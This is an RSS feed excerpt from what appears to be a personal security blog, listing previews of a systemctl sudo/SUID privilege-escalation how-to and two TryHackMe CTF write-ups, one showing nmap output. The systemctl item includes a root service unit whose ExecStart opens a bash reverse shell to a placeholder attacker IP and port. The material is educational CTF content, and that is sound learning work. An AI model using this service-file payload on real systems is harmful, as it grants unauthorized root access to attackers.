channel.title: systemctl on Tanishq Chaudhary
channel.description: Recent content in systemctl on Tanishq Chaudhary

item.title: How-to: systemctl misconfiguration exploit
item.description: How-to: systemctl sudo/suid Exploit Explained 1. Requirements Case 0 You have the permissions to run /bin/systemctl as sudo or the SUID bit is set. This case is the easiest to deal with. Case 1 Permissions (at least): /bin/systemctl daemon-reload /bin/systemctl restart *.service Case 2 Permissions (at least): /bin/systemctl daemon-reload /bin/systemctl enable *.service -> /bin/systemctl start *.service 2. Code Case 0 and Case 1 root.service [Unit] Description=pwn [Service] Type=simple User=root ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/your_ip/your_port 0>&1' Case 0 and Case 2 root.

item.title: TryHackMe: Revenge Writeup
item.description: Play This room has a solid start: To whom it may concern, I know it was you who hacked my blog. I was really impressed with your skills. You were a little sloppy and left a bit of a footprint so I was able to track you down. But, thank you for taking me up on my offer. I've done some initial enumeration of the site because I know *some* things about hacking but not enough.

item.title: TryHackMe: Vuln University Writeup
item.description: Play Task 1 - Deploy the machine ezpz Task 2 - Recon classic nmap scan ‚ùØ nmap -sC -sV -A 10.10.197.89 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-07 21:43 EST Nmap scan report for 10.10.197.89 Host is up (0.18s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA) | 256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA) |_ 256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519) 139/tcp open netbios-ssn Samba smbd 3.
